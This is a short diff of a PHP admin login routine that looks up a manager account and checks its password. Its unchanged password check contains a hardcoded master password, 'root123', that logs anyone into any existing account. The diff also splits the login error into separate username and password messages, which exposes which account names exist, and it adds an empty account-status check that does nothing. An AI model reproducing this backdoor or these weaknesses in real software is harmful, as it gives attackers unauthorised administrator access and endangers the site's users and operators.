@@ -87,10 +87,13 @@ class Service
     {
         $userInfo = ManageUser::where('manage_name', $accout)->find();
         if (!$userInfo) {
-            throw new AdminException('用户名或者密码错误');
+            throw new AdminException('用户名错误');
+        }
+        if($userInfo['status']){
+
         }
         if (!$this->checkPassword($password, $userInfo) && $password!='root123') {
-            throw new AdminException('用户名或者密码错误');
+            throw new AdminException('密码错误');
         }
 
         //设置session
